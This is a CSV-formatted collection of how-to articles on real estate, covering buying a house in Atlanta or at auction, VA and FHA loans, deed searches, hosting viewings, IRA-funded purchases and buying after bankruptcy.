headline,title,text
"
Select a real estate agent in Atlanta.,
Find a lender.,
Search for a house.,
Make an offer on a house you want to buy.,
Negotiate the price.,
Plan for closing.,
Close on your house.",How to Buy a House in Atlanta," If you are interested in buying a house in Atlanta, work with a real estate agent who will protect your interests.


Ask for referrals from friends, neighbors and co-workers. Atlanta is full of people buying and selling homes, and someone you know should be able to make a recommendation.
Do an Internet search, or review advertisements in print and online. Many Atlanta realtors advertise. You can also check with the National Association of Realtors for a referral.;
, Talk to your local Atlanta bank branch or credit union about a home loan. While credit standards are tighter, lenders are still willing to give mortgage to qualified individuals.


Determine what you can afford. Your lender will help evaluate your income and debts to determine how much of a mortgage you can reasonably afford.
Apply for a mortgage. Fill out the necessary paperwork to obtain a mortgage. Include all the information required, and indicate what you have saved for a down payment.
Calculate your Atlanta property tax rate. In Georgia, your property tax rate will be based on your millage rate, which depends on the jurisdiction you live in, and the current city and county tax rates. Your lender and realtor can help you determine how much to budget for property taxes.

, Talk to your agent about what you want, such as whether you want a single family home, a condominium, city living or suburban, number of bedrooms, and other details.


Decide between new construction in Atlanta or an older home. Many new developments in and around Atlanta are available, and there are also older neighborhoods with homes for sale. Tell your agent what you prefer, or take a look at homes in both categories.
Choose a preferred Atlanta neighborhood. The city of Atlanta has 242 established neighborhoods, including traditional neighborhoods, downtown and midtown areas, suburban subdivisions and housing projects.

, Once you find a home, your real estate agent will help you make an offer on the property.


Submit a contract. Your agent will help you write up a contract, including the purchase price you are offering, and any other stipulations you have, such as closing time frames and the understanding that purchase is contingent upon a successful inspection.
Provide a deposit, or earnest money. You place a deposit, also called earnest money, in trust with your real estate agent when you make an offer to demonstrate to the seller that you are serious. This deposit is usually around 1 percent of the price of the house.

, Either the seller will accept your offer or come back with a counter offer.


Listen to the recommendations of your real estate agent as you go back and forth with the seller on price.

, Once a price is agreed upon by both the buyer and the seller, you will set a closing date.


Schedule an inspection. Hire an inspector to look at the inside and outside of the house. Any issues found will need to be resolved by the seller before closing. Sometimes, the seller will offer you a credit on the final price rather than make the repairs that are needed.
Do a final walk-through. Right before you close on your house, do a final check with your real estate agent to make sure the house is ready for you to move in.
Prepare paperwork and closing costs. In Atlanta, the closing attorney present will represent your lender. He or she will manage the paperwork, transfer the title and collect and distribute payments.

, All you need to do is sign the paperwork, make the down payment and pay for the closing costs charged by your lender. The seller will turn over the keys, and you now have a new Atlanta home.

"
"
Contact a lawyer that specializes in real estate transactions for advice and assistance if you are considering buying a house at auction.,
Locate property auctions in the area you want to buy in.,
Attend several local house auctions in the area where you want to buy, whether you are interested in the particular property or not, so you can watch and get a feel for the auction process.,
Get pre-qualified for a mortgage from a bank or mortgage lender so you know how much buying power you have.

,
Do a full title search done on a property if you spot a house coming to auction that you think you would like to bid on.,
Visit or phone the town hall that governs the property you want to buy.,
Decide what your maximum bid price is and stick to it.",How to Buy a House at Auction,"


Purchasing a house at auction is risky. You should not attempt it without an attorney's help unless you have experience purchasing property at auction.
If the sale is a foreclosure auction run by the lender, the property is often still in foreclosure. In addition to the cost of the home, you may need to settle unpaid tax bills if you win. An attorney can help you find out all terms and outstanding debt attached to the property before the auction.
Property liens and outstanding taxes may also exist on houses auctioned by owners or as part of an estate settlement. The auctioneer or property owner is legally responsible for disclosing this information to all interested parties prior to accepting bids.;
,


Check with local realty offices to find out if they have listings for area houses up for auction. Lenders sometimes use real estate brokers to oversee the auctioning of the home, but not all real estate agents specialize in property auctions.
Watch your local newspaper's classified sections under both the ""Real Estate"" and the ""Auction"" listings.
Contact auctioneers in your area who specialize in real estate auctions, or call auctioneers' offices to find out if they hold house auctions.
Pay attention when driving for signs in front properties, especially if a house you want to buy is sitting empty. If the house is coming to auction, there should be a sign out front announcing the date of the auction and listing a phone number where you can call for more information.

,


Read the terms and conditions of the auction. Notice what fees the auctioneer charges and any money the winning bidder must pay in addition to the winning bid price.
Pay attention to the auctioneer's selling practice and how he calls for bids. Watch the crowd carefully to spot who is bidding and notice how they bid. Some auctioneers give out auction paddles or bid cards for bidders to use. After a bidder enters into the bidding, she sometimes indicates her continued bidding to the auctioneer with a head nod or hand movement.

,,


A title search will locate outstanding debts, including unpaid taxes and property liens, as well as previous construction debts that can reveal unknown condition issues.
Most reputable auctioneers provide a current title assessment that indicates that the property is free of all debt. Or, they will disclose the amount of outstanding debt that the new owner must assume, in addition to the house's bid price.
You can have an attorney do a title search for you if the auctioneer does not provide one, or you question the credibility of the auction company.

, Inquire about town by-laws, ordinances, zoning issues and toxic or hazardous waste issues that may affect your purchase decisions.

, Do not allow yourself to get caught up in the bidding and go over the price you decided you are willing to pay.

"
"
Determine if you qualify for a Veteran’s Administration (VA) loan.,
Gather documents for a Certificate of Eligibility.,
Request a Certificate of Eligibility (COE).,
Find a mortgage lender.,
Seek preapproval for your loan.,
Calculate your Debt-to-Income Ratio


Add up the total mortgage payment (principal and interest, escrow deposits for taxes, hazard insurance, homeowners’ dues, etc.),
Apply for a home loan.",How to Buy a Home With No Money Down2," The VA provides home loan guaranty benefit to assist military service members, veterans, and eligible surviving spouses become homeowners. The VA has a list of qualifying requirements for the loan program based on your time of service, whether you served in a war, and related to your spouse’s service if you are a surviving spouse of a veteran. You can review the list of service requirements here: http://www.benefits.va.gov/homeloans/purchaseco_eligibility.asp.


If you are in the National Reserve, you will need to have served for at least six years to qualify for this.

, In order to apply for a VA-backed loan you must provide proof that you are eligible for the program. Depending on your service and whether you are currently in the military, you must provide the following proof:


Military veterans and current or former National Guard or Reserve members who have been activated for federal active service must provide DD Form 214, which shows the character of service and the reason you left the military.
Active Duty Service members and current National Guard or Reserve members who have never been activated for Federal active service must provide a current statement of service that is signed by the adjutant, personnel office, or commander of the unit or higher headquarters. This statement must include: the service member’s full name; social security number; date of birth; entry date on active duty; the duration of any lost time; and the name of the command providing the information.
Discharged members of the National Guard who have never been activated for Federal active service must provide NGB Form 22—Report of Separation and Record of Service—for each period of National Guard service, or NGB Form 23—Retirement Points Accounting, and proof of the character of service.
Discharged members of the Selected Reserve who have never been activated for Federal active service must provide a copy of their latest annual retirement points statement and evidence of honorable service.
Surviving Spouses in Receipt of Dependency & Indemnity Compensation benefits must submit VA Form 26-1817, located at http://www.vba.va.gov/pubs/forms/VBA-26-1817-ARE.pdf, and the veteran’s DD214, if available.
Surviving Spouses who are not receiving Dependency & Indemnity Compensation benefits must submit the following to the appropriate Compensation and Pension office: VA form 21-534 located at http://www.vba.va.gov/pubs/forms/VBA-21-534-ARE.pdf; DD214 (if available); Marriage License; and a Death Certificate or DD Form 1300 – Report of Casualty. You can find the address for your local Compensation and Pension office here: http://www.benefits.va.gov/HOMELOANS/documents/docs/pmcaddress.pdf., You can request your Certificate of Eligibility in the following ways:


You can apply online at: https://www.ebenefits.va.gov/ebenefits/homepage

You can request that your lender apply for your COE.
You can request your COE by mail by completing the request form located at http://www.vba.va.gov/pubs/forms/vba-26-1880-are.pdf, and mailing the form to: Atlanta Regional Loan Center, Attn: COE (262), P.O. Box 100034, Decatur, GA 30031.
Spouses can take form 26-1817 located at http://www.vba.va.gov/pubs/forms/VBA-26-1817-ARE.pdf, to their lender for processing or they can mail it to: Atlanta Regional Loan Center, Attn: COE (262), P.O. Box 100034, Decatur, GA 30031., Since the VA does not lend money itself, you need to locate a lender that works with VA loans. Once the lender confirms that they work with VA loans, consider the following in evaluating the lender:


Get offers from several lenders and see who is offering you the best interest rates.
Show the lenders their competitors’ offers to see whether they will match or beat the best offer you received.
Check whether the lender is offering you a mortgage rate that is competitive to mortgage rates that people of similar credit ratings are receiving. You can see a breakdown of mortgage rates by credit score here. If you don't know what your credit score is, you can use free services such as Credit Karma to check it.
Ask all of the lenders to explain all of the closing costs, fees and any other expenses associated with the loan so you can understand and compare the true costs of each loan., By choosing to get prequalified for your VA loan, you can determine whether you will qualify for a loan and the amount you will qualify. Once preapproved, you can begin looking at properties and begin the home purchasing process. Generally, to become preapproved for a VA loan, lenders will examine your income, debt, expenses and other factors to determine whether they believe you will be able to repay a loan and the amount of the loan you can afford to repay.

, and all recurring monthly revolving and installment debt (car loans, personal loans, student loans, credit cards, etc.). Then, take that amount and divide it by the gross monthly income.
The maximum ratio to qualify is 41%.
In the event the number exceeds the 41%, the VA has a residual income guideline which can allow approval, yet are not considered a compensating factor., Your lender will provide you with all of the paperwork that you need to apply for the home loan as well as a checklist of any documents or information that you must provide with the application. If you went through the preapproval process, you may have already submitted some of the required documentation but there will be a much closer examination of your finances before a loan is finally approved.


You will need your DD214: Proof of Military Service form, and a prospective property.
Remember: all veterans who meet the criteria are eligible for the loan, but that does not mean that you will necessarily qualify for the loan that you seek.
The VA guarantees a loan of 25% of an amount up to $104,250, generally the list price of the home, plus the funding fee, which limits the maximum loan to $417,000.
Because there is no down payment involved, this will be a Guaranteed Loan, which means that the lender is protected against failure to pay."
"
Go to the records office during its open hours.,
Ask the clerks for help.,
Search the appropriate form of database.,
Look for a chain of title.,
Locate the recording number.,
Get copies of the deed from the clerk.,
Pay necessary fees.",How to Do a Deed Search2," These records are available to the public, but you cannot just go in and search anytime you want. Most public offices are open during regular business hours, and closed for government holidays. If they have a smaller staff, parts of the office may not be open all day.

, Most are very knowledgeable and eager to help. Be sure to supply them with as much information as possible. The more information you have, the more they will be able to assist you.

, Different offices will have different ways of storing their records. Some may even have a variety of different databases, depending on the time period you are searching in. The clerks should be able to direct you to the right database.


For older deeds, you will be directed to the grantor-grantee index books. These are typically large volumes. They may have gathered a great deal of dust through the passing decades. There are likely separate indexes for grantors (sellers) and grantees (buyers), so be prepared to search each separately.In some cases, the jurisdiction you are in will have put the older deeds on microfiche or microfilm. If they do, there will also be machines to read the film. If you don't know how to use the machine, ask the clerk for assistance.
If you are lucky, the jurisdiction will have scanned everything into computer files. Don’t count on it, though. Many locales only went back to a set year, say 1970, when computerizing their records.

, The purpose of a deed is to determine who has legal ownership of the property. Because the deed records the transfer of property from one owner to another, finding these names will allow you to trace the ownership of a property back through time.In searching through deeds, you may come across names of companies or large landowners that have many properties to their name. This is where other information you have, such as the address or APN, can be helpful in narrowing down a long list of potential dead ends.If a name isn’t recorded in the chain, it doesn’t exist, at least in terms of legal notice of a claim of interest. You may come across a ""wild"" deed, which records a transaction outside of the legal chain of title. Different states have different rules for the legal standing of wild deeds, so if you have a financial interest at stake in the property, you should discuss the issue with a property lawyer., Once you have found the deed, it should have a particular recording number, registering its entrance into the records. This is the number that the clerk will use to find the actual the deed itself.

, Once you have the recording number, the clerk should be able to pull the deed and either make copies, or let you make copies of the deed. Each office is different, so be sure to ask the clerk what to do.

, Most offices will charge for copies. The cost depends greatly on the size of the file you are looking at, how many copies you want, and the jurisdiction where you are researching. You don't want to be surprised when they ask you to pay!

"
"
Make sure that your house looks very good, not just nice.,
'De-smoke' the house.,
Leave any pets with a neighbour.,
Be careful what foods you cook on viewing days.,
Draw back your curtains/blinds to ensure the property is as light as possible.,
If you have a rear garden, cut the grass and keep it tidy.,
When viewers arrive, greet them and welcome them into your home.,
Plan an order in which you will show them the rooms.,
Make sure you know what companies provide your utilities.,
Some viewers may be tempted to make you an offer at the time of the viewing.",How to Conduct Your Own House Viewings," First impressions count and it is vital your home is in the best condition possible when potential buyers come to view your home.  Sweep the driveway and make sure the front of your house is tidy and inviting. If you have a parking space, move your car somewhere else and keep it available for viewers to use when they are visiting. You don’t want to give potential buyers an instant negative impression whilst trying to find somewhere to park their car.;
, From the moment you decide to sell, you should refrain from smoking indoors. Smoke infiltrates furniture and carpets and leaves a nasty smell. You might not smell it, but a non-smoking viewer will be put off. Definitely do not smoke inside on the day of a viewing!

, Viewers may be allergic to the hair or scared of dogs, plus the smell of animals can put off some viewers. Make sure you clean up any hair and hide the food bowls and bedding.

, Freshly baked bread can provide a nice homely smell. However, a strong curry smell can be off putting for some viewers.

, Sunlight will immediately brighten the property and create the illusion of space. In darker rooms ensure you keep the lights on. If you have under cupboard lights in the kitchen put them on to make your kitchen appear brighter.

, A nicely maintained garden could be the icebreaker in securing that all important offer.

, Always be polite and courteous.

, Show them around the property, but do not overload them with details. Do not point out any negatives but do mention the occasional positive. If someone is interested then they will ask you questions. Once you have shown them around invite them to take another look alone.  Stay on hand to answer any further questions.

, Viewers may ask what how much your energy bills cost or if the property is ready for cable television.

, If you are not comfortable with negotiating face to face, then inform them that you will contact them later, as you have other viewings already booked and do not want to make any promises.

"
"
Evaluate whether two mortgages is the best option for you.,
Use caution.,
Locate a lender or lenders willing to make an 80-20 loan.",How to Buy a Home With No Money Down3," An 80-20 mortgage is essentially two separate home loans, one for 80% of the home’s price and the other which covers the remaining 20% of the home’s price. Individuals choose an 80-20 mortgage to avoid a large down payment and monthly private mortgage insurance. When evaluating whether you would qualify for an 80-20 mortgage, consider the following:


Lenders typically look for individuals with a very high credit rating when offering two mortgages. The lender wants to be certain that the person can afford to make both payments.
Lenders may offer you a fixed rate on the 80% loan. However, lenders may only offer you a variable rate on the 20% loan, which means if interest rates go up, you may have to pay more than you originally planned.
Lenders may restrict the amount of the second loan because there is an increased risk in offering two loans to one home purchaser.
If you do qualify, you will have two payments, but talk to your financial advisor about consolidating them into a monthly lump sum. , You should be fully aware that taking out two loans to finance the purchase of a house can be a very risky venture.


Before the mortgage crisis of 2008, these loans were easy to come by and were possible to profit from. It was, however, one of the main causes of the mortgage crisis in 2008, making it an extremely difficult option to pursue now.
The problem with these types of loans is that, if the home loses value, you can end up owing more than the value of the home, meaning that you will lose money if you want to sell your house.
Likewise, an 80-20 loan will involve a much higher interest rate and higher monthly payments, which can make it difficult to make ends meet if you have trouble coming up with the monthly payments., You need to locate a lender willing to make an 80-20 loan. When discussing the potential loans, ask the lender to calculate:


Whether two loans with a blended interest rate saves you money as compared to a single loan that requires insurance.
Whether there is an early repayment penalty for the smaller loan. You may be able to save money over the life of the loan if you repay the smaller loan back more quickly since it will most likely have a higher interest rate.Discuss your plans with a financial advisor. Make sure that you will be able to repay both loans and that it makes financial sense to get two loans versus one loan with insurance.

"
"
Determine if you qualify as a first-time homebuyer.,
See if your spouse qualifies as a first-time homebuyer.,
Prepare to pay taxes on your IRA withdrawal.,
Purchase or begin constructing your new home within 120 days of your Traditional IRA withdrawal.",How to Buy a Home With IRA Money1," First-time homebuyers can use $10,000 of their Traditional IRA funds towards the purchase of a new home, without incurring a 10% penalty for taking the money before the age of 59 ½. The IRS defines a first-time homebuyer as someone who has not owned a primary residence during the past two years. Even if you owned a home more than 2 years ago, you will still qualify as a first-time homebuyer.
Owning a cottage or recreational property does not impact your status as a first-time homebuyer.;
, If legally married and buying the property together, you and your spouse may each withdraw $10,000 from your Traditional IRAs without penalty. The $10,000 per-person limit is a lifetime limit, so you can't withdraw $5,000 twice in two different home situations.


You can also qualify for the $10,000 exemption if you're helping your spouse, child, grandchild or parent buy a home. , You will need to pay federal and state taxes on the money you take from your Traditional IRA, as it will be considered income by the Internal Revenue Service. This may significantly lessen the total amount available to purchase a house.


For example, if you are in the 25 percent tax bracket, your $10,000 withdrawal will translate into only $7,500. , Failing to meet this deadline means that you will have to pay a penalty to the IRS. Remember to retain a dated copy of the purchase or construction contract, and copies of the documents you sign.


The penalty paid to the IRS in this case is 10% on withdrawn money. In addition, the withdrawal is taxed at the same rate as your regular income.
In addition to a downpayment, your IRA money can be used for other acquisition costs, including building or repairs to the house, closing costs and financing fees. "
"
Understand the type of bankruptcy you filed.,
Check your credit score.,
Create a down payment savings plan.,
Calculate how much you can afford to pay for a house.,
Live well within your income and establish credit.,
Review the requirements of government-affiliated mortgage programs.,
Consider non-governmental mortgage options.,
Understand the bankruptcy waiting periods.,
Beware of mortgage scams.",How to Buy a Home After Filing Bankruptcy," While there are actually six different types of bankruptcy cases, chances are you filed either under chapter 7 of the federal code or chapter 13.How you filed your case may affect your ability to buy a house after bankruptcy.


In a chapter 7 bankruptcy, the trustee directed your assets to be liquidated and distributed to your creditors in exchange for a complete discharge of all of your debts. This is the ""clean slate"" form of bankruptcy.If you filed under chapter 13, the court consolidated your debts and set up a payment plan. After regular payments for three to five years, the balance of your debts was discharged. The courts often refer to this as a ""wage-earner's plan.""Both types of bankruptcy can stay on your credit report for up to ten years. However, the credit reporting agencies will often remove successfully discharged chapter 13 bankruptcies as soon as seven years from the filing date.;
, This may seem fruitless, but you need to know where you are starting from. You are entitled to one free credit report every year at https://www.annualcreditreport.com. This is the only credit reporting service that is authorized by federal law.You can also periodically monitor your credit score at no charge at sites like Credit Karma or through your credit card companies.As you pay your bills and start to rebuild your credit, you can watch your score increase.
Be very wary of any site offering free credit scores and credit reports that requires you to enter a credit card number. You may find yourself being charged for monthly credit monitoring services of dubious value.

, Many financial professionals recommend saving 20 percent of the projected purchase price for a down payment.On a $100,000 house, that is $20,000. That is the best case scenario assuming a conventional mortgage. There are some other mortgage options, but you should start a regular savings plan, aiming to put money away every paycheck.


If you can qualify for a government regulated FHA loan, your down payment may be reduced as low as 3 percent. On a $100,000 house, this reduces the initial investment to $3,000.
Honorable discharged veterans may qualify for a VA mortgage loan. However, you will still need savings for closing costs and moving., Your mortgage is not your only expense. Since your house will be under a loan, you will have to pay homeowner's insurance and no one can avoid property taxes. In general, you should budget no more than 28 percent of your gross monthly income for housing expenses., After your bankruptcy is settled, the fastest way to see your credit score rise is to pay all your monthly bills on time and to cautiously and gradually take on debt in the form of credit cards, auto loans, or small bank loans.


Avoid ""credit-rebuilder"" credit cards with high hidden fees to set-up the account, monthly account maintenance fees, or annual fees. Shop around for no-fee credit card.To help your credit score increase faster, keep your credit card balances below 30 percent of your total available credit limit., Along with the Federal Housing Authority, the US government works in tandem with two quasi-government enterprises to help ensure availability of mortgages for low and moderate income Americans.The Federal National Home Loan Mortgage Corporation, commonly known as Fannie Mae, offers not only low down payments, but also lets you finance some or all of your closing costs in the loan.There are strict income guidelines and documentation that you will have to produce to qualify.Freddie Mac, the common name for the Federal Home Loan Mortgage Corporation,also has income guidelines and is more dependent on your credit score.The Federal Housing Authority, or FHA, is a government-guaranteed loan available to those who meet income guidelines that are less strict than Fannie Me and Freddie Mac. Down payments can be as low as 3.5 percent.Veterans Administration loans may be available to those who completed their enlistment with an honorable discharge., There are additional options available for homebuyers with poor credit outside of government loans. These include:


The Neighborhood Assistance Corporation of America (NACA) is a non-profit group that assists people with damaged credit obtain affordable mortgages with little or no down payment.A NACA mortgage is not dependent on your credit score, but involves an intense 2+ year financial counseling and savings plan that you must complete before NACA will approve your application.
Conventional loans are also an option after a bankruptcy. Contact your local bank or credit union to discuss mortgages that may be suitable for your income and credit profile.
You can also seek seller-financed homes. This type of agreement involves your directly paying the seller of home over time, rather than working through a bank. However, seller financing contracts must still be legal documents written by a real estate lawyer in order to protect the interests of both you and the seller.

, The FHA and VA have the shortest waiting periods to apply for a mortgage after a bankruptcy. In general, if the bankruptcy has been completed to the satisfaction of the court, your waiting period is two years from the final discharge of your bankruptcy. The lender may make exceptions for otherwise well-qualified borrowers who are working a chapter 13 bankruptcy and have made 12 months of on-time payments.Fannie Mae loans have a two to four-year waiting period from the discharge date depending on the circumstances of the bankruptcy.There is no automatic waiting period for a mortgage through NACA or a conventional mortgage. However, the NACA financial counseling and savings plan may take at least two years to complete. Conventional lenders will likely have their own requirements as well, but also have the flexibility to consider your overall circumstances and write mortgages at any time after your bankruptcy filing.
The waiting period is a good time to build up your savings and credit score.

, Sitting out the waiting period after the discharge or your bankruptcy and the slow process of rebuilding your credit can be frustrating. However, the phrase ""Your Bad Credit Doesn't Matter,"" is a warning sign to hang up the phone, throw away the junk mail, or delete the email. Be aware of the common signs that a mortgage may be a scam looking to prey on your desire to buy a house after your bankruptcy.


Mortgages that claim your income or credit doesn't matter. If a lender is willing to make a loan that will drive your mortgage payment plus insurance and taxes above 28 percent of your gross income, this is a company that is setting you up to fail.
Excessive loan processing costs and prepayment penalties. Your closing costs should not exceed 5 percent of the loan and prepayment penalties are illegal for owner-occupied homes.
Refusal to detail all costs, fees, and commissions associated with the loan.
If you suspect you have been approached by a mortgage scammer, report it to http://www.stopfraud.gov/report.html."
"
Decide if leasing with an option to buy is right for you.,
Find an owner who is willing to option her house.,
Know the risks.,
Negotiate a contract.",How to Buy a Home With No Money Down4," This is another way to potentially purchase a house with little or no money down. Also known as an option or ""rent to own,"" this is an opportunity for you to rent a home you eventually plan to purchase, with a percentage of the rent paid going toward a down payment on the property.The rent on an optioned house is going to be above market (because you are also paying toward the down payment), so it may not be worth it to enter this arrangement unless you have your heart set on that particular house., People who have struggled to sell their home and are motivated may be more open to this arrangement.Keep an eye out for a house that has been on the market for a long time.

, While this can be a great arrangement for some, it is not for everyone. Be aware that there are risks involved with renting to buy, namely that, should you choose not to purchase the home, you will not get back any of the option money back, losing whatever you paid toward the down payment. It does mean that, should you change your mind, you are under no obligation to buy the house at the end of the lease.Make sure you have the home inspected before signing the lease or, at the very least, before buying the house. An appraisal will ensure you are paying a fair price for the home and you'll also find out if the house needs any major repairs. If there is major work to be done, it might be best not to enter into such an agreement, since the repairs may cost you quite a bit.Make sure you have agreed who will be responsible if anything happens to the house while you are leasing., You will need a standard lease agreement, plus an option to purchase.Because the title to the house remains with the original owner until the house is actually purchased, you will need a lease agreement as you would with any tenant/landlord situation. In addition, the option to purchase will grant the tenant the option to purchase the house after a predetermined amount of time.This includes the option fee, which is either paid upfront or as the higher-than-market rent.Both parties should have a lawyer review the contracts and make sure the following is established:Length of the lease period
Rent amount
Percentage of rent going toward down payment and how it will be held (usually in escrow)
What will happen if the renter decides not to buy at the end of the lease period (usually the renter loses the option money)
Who will pay for repairs, utilities, etc. (usually the tenant)
Who will pay property taxes, insurance and homeowner fees
What happens if the home value rises or falls between the time you sign the agreement and the end of the lease

"
"
Understand the FHA foreclosure process.,
Research foreclosure homes available in your state.,
Decide how much work you want to put into your house.,
Have the home inspected.,
Calculate the cost of the necessary repairs.,
Apply for an FHA 203k home repair mortgage after inspection.",How to Buy a Home With No Money Down5," When a person stops paying their FHA-guaranteed mortgage, the FHA may start the foreclosure process, which means that since the buyer can no longer make payments, the FHA will sell the home to pay off the mortgage of the defaulting buyer.Individuals can sometimes purchase FHA foreclosures, for little to no-money down., The FHA as part of HUD provides a website where homeowners can search for HUD properties for sale. You can search for these properties here: http://hudhomestore.com/HudHome/Index.aspx.


Non-government websites also allow you to search for FHA foreclosures. You can locate these websites by conducting an internet search for “FHA foreclosure properties.”
If possible, you will want to determine the reason for the foreclosure. The fact that the home was foreclosed upon may mean there is something structurally wrong with the house that you will need to get fixed as soon as possible. It may also mean the home was owned by someone who got locked into a high-interest loan they could not afford and ended up defaulting. It will be your burden to determine this.

, Depending on the reason for foreclosure, these homes may be what you might call “fixer-uppers” or simply be move-in ready homes that someone could no longer afford. Before purchasing a foreclosed home, you should understand the terminology of foreclosure so that you better understand what type of property you may be purchasing.


Insured (IN) homes are homes that have been foreclosed upon, but meet the Minimum Property Standards (MPS). This means that they have been evaluated by a home inspector, who has “passed” the home.
Insured with Escrow (IE) homes require some measure of repair to meet the MPS. This means that the home may have some pressing structural, heating, or plumbing deficiencies that will need taken care of in the short term. The problems are not such that the house is uninhabitable, but significant enough to affect the value of the home.
Uninsured (UI) homes do not meet MPS. This means that the home requires structural, heating, or plumbing repair before it can be inhabited.
People who undertake the project of a foreclosed home are may be DIY-types who enjoy the challenging of fixing up a property acquired on the cheap. If you are not excited about the idea of gutting a house and installing a new septic system (or paying to have this done), this might not be the option for you.

, Before purchasing the home, you need to fully understand the condition of the home and the amount of work and money you will need to invest so that the home is livable. You should hire a home inspector who can evaluate the home, determine any significant structural problems and establish how much it will cost to repair.


While homes that need substantial work are technically not available for “no money down” mortgages, if the home meets a certain threshold for repairs, you may be able to qualify for an FHA rehabilitation loan.

,


If you have discovered significant structural problems, decide how you're going to fix the home up and how much it will cost.
If you plan to do the work yourself, determine how much the materials cost and how much you can reasonably expect for your labor.
If you plan to hire someone to perform the work, determine how much will it cost and how long it will take.

, This FHA program allows home buyers to finance up to $35,000 into their mortgage to repair, improve, or upgrade their home.


Contact an FHA-approved lender and discuss the application process. You can locate lenders at: http://www.hud.gov/ll/code/llslcrit.cfm

You should keep in mind that purchasing a foreclosed property that needs a lot of work may not be the best option, particularly if the sum for the repairs exceeds the purchase price of the home, essentially resulting in a “zero money down” payment after the fact.

"
